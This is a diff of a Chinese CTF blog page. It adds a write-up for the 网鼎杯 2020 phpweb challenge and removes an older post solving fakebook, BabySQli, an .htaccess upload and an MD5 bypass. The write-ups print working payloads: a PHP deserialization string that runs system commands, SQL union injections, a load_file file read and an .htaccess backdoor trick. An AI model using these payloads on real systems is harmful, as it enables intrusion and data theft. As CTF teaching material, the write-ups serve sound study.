@@ -71,6 +71,117 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-58" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/08/page-58/" class="article-date">
+  <time class="dt-published" datetime="2021-07-08T06:44:25.000Z" itemprop="datePublished">2021-07-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/08/page-58/">网鼎杯 2020 朱雀组phpweb</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>主页这边抓包发现 func=date&amp;p=Y-m-d+h%3Ai%3As+a  这句话这边可以传参 </p>
+<p>func=file_get_contents&amp;p=index.php  然后给了一堆的源码</p>
+<?php
+$disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");       ；这边func可以用的功能被禁用了一大堆就很烦 但是反序列化可以
+function gettime($func, $p) {
+    $result = call_user_func($func, $p);
+    $a= gettype($result);
+    if ($a == "string") {
+        return $result;
+    } else {return "";}
+}
+class Test {
+    var $p = "Y-m-d h:i:s a";
+    var $func = "date";
+    function __destruct() {
+        if ($this->func != "") {
+            echo gettime($this->func, $this->p);
+        }
+    }
+}
+$func = $_REQUEST["func"];
+$p = $_REQUEST["p"];
+
+if ($func != null) {
+    $func = strtolower($func);
+    if (!in_array($func,$disable_fun)) {
+        echo gettime($func, $p);
+    }else {
+        die("Hacker...");
+    }
+}
+?>
+
+<p>虽然被禁用了一大堆但是还有反序列化可以用  func=unserialize&amp;p=index.php</p>
+<?php
+class Test {
+    var $p = "ls";
+    var $func = "system";
+    function __destruct() {
+        if ($this->func != "") {
+            echo gettime($this->func, $this->p);
+        }
+    }
+}
+
+$a=new Test();
+echo serialize($a);    
+
+贴一下构造的序列化代码构造这个生成O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";} 
+
+payload1
+
+ func=unserialize&p=O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";}   获得文件列表
+
+func=unserialize&p=O:4:"Test":2:{s:1:"p";s:14:"ls ../../../..";s:4:"func";s:6:"system";}  然后给了更多
+
+
+
+但是你丫的怎么没有flag ┗|｀O′|┛
+
+![wwwwww.png](https://github.com/ajin-max/ajin-max.github.io/blob/master/img/wwwwww.png?raw=true)
+
+**知识点：寻找flag文件常用命令小结：**
+system(‘ls’) : 列举当前目录下的所有文件
+system(“find / -name flag*”)：查找所有文件名匹配flag*的文件
+system(“cat $(find / -name flag*)”)：打印所有文件名匹配flag*的文件
+
+那么这个p就得变成p=cat $(find / -name flag*)
+
+func=unserialize&p=O:4:"Test":2:{s:1:"p";s:25:"cat $(find / -name flag*)";s:4:"func";s:6:"system";}  最终payload
+
+![weww.png](https://github.com/ajin-max/ajin-max.github.io/blob/master/img/weww.png?raw=true)
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/08/page-58/" data-id="ckroqtfm00012yww741ene234" data-title="网鼎杯 2020 朱雀组phpweb" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-57" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/07/08/page-57/" class="article-date">
@@ -517,81 +628,6 @@ if(isset($_GET['exp'])){       ；典型的木马get方式
 
 
   
-    <article id="post-page-46" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/05/03/page-46/" class="article-date">
-  <time class="dt-published" datetime="2021-05-02T23:58:56.000Z" itemprop="datePublished">2021-05-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/05/03/page-46/">刷题4</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><strong>[网鼎杯2018]fakebook题解</strong>  先注册一个 然后发现/view.php?no=1 貌似可以sql注入?no=-1 显示了Notice: Trying to get property of non-object in /var/www/html/view.php on line 53 数字型 的所有就?no=0  扫后台发现robots.txt 然后又发现一个user.php.bak   可以大概猜一猜flag位置<br>然后这又是一个序列化题目<br>&lt;?php</p>
-<p>class UserInfo<br>{<br>    public $name = “aaad”;<br>    public $age = 19;<br>    public $blog = “file:///var/www/html/flag.php”;</p>
-<pre><code>public function __construct($name, $age, $blog)
-&#123;
-    $this-&gt;name = $name;
-    $this-&gt;age = (int)$age;
-    $this-&gt;blog = $blog;
-&#125;
-
-function get($url)
-&#123;
-    $ch = curl_init();
-
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    $output = curl_exec($ch);
-    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    if($httpCode == 404) &#123;
-        return 404;
-    &#125;
-    curl_close($ch);
-
-    return $output;
-&#125;
-
-public function getBlogContents ()
-&#123;
-    return $this-&gt;get($this-&gt;blog);
-&#125;
-
-public function isValidBlog ()
-&#123;
-    $blog = $this-&gt;blog;
-    return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);
-&#125;
-</code></pre>
-<p>}<br>$a = new UserInfo(“aaad”,19,”file:///var/www/html/flag.php”);<br>var_dump(serialize($a));<br>?&gt;   构造这个然后复制一波 aaad 19 4399 这些是自己弄 要弄什么都可以 ?no=-1/<strong>/union/</strong>/select/<strong>/1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:4:”aaad”;s:3:”age”;i:19;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}’  然后右键查看源码 有个data text 啥的<br>那段复制然后base64解码就可<br>或者因为sql注入没有过滤load_file直接取得flag<br>no=-1 union/</strong>/select 1,load_file(“/var/www/html/flag.php”),3,4<br><strong>[GXYCTF2019]BabySQli 1</strong>  union select 1，2，3   在这个关要构造假身份     利用sqli的特性：在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。select * from ‘users’ where name=’person’ union select 1,’admin’,’e10adc3949ba59abbe56057f20f883e’,4,5    按照我们的输入，sqli在数据库中写入数据，相当于伪造了一个身份，就可以用这个身份登录了。<br>试探id username password 这三个的顺序如何 name=aaa’ union select ‘admin’,2 #&amp;pw=qqq   显示wrong user<br>name=aaa’ union select 1,’admin’,3 #&amp;pw=qqq 显示wrong password   然后把3 改成qqq的MD5加密形式就可以了<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3674%EF%BC%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%89">https://xz.aliyun.com/t/3674（反序列化的一些知识点）</a><br><strong>[MRCTF2020]你传你🐎呢 1</strong><br><strong>&lt;FilesMatch “1.png”&gt;</strong><br><strong>SetHandler application/x-httpd-php</strong><br><strong></FilesMatch></strong>  传一个这样的.htaccess  这个是将1.png 默认成php   然后传一个1.png的后门文件就可以了<br><strong>[MRCTF2020]Ez_bypass 1</strong>又是一题MD5 比较的 那就数组绕过?gg[]=1&amp;id[]=2<br>然后post一个passwd=1234567a就可以了  因为  if($passwd==1234567)</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/05/03/page-46/" data-id="ckroqtflt000uyww74dy3gm2e" data-title="刷题4" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -632,6 +668,10 @@ public function isValidBlog ()
           </li>
         
           <li>
+            <a href="/2021/07/29/page-80/">CISCN2019 华东南赛区Web11</a>
+          </li>
+        
+          <li>
             <a href="/2021/07/21/page-79/">MRCTF2020Ezpop</a>
           </li>
         
@@ -641,10 +681,6 @@ public function isValidBlog ()
         
           <li>
             <a href="/2021/07/21/page-77/">网鼎杯 2020 朱雀组Nmap</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/16/page-76/">羊城杯 2020image_rar</a>
           </li>
         
       </ul>
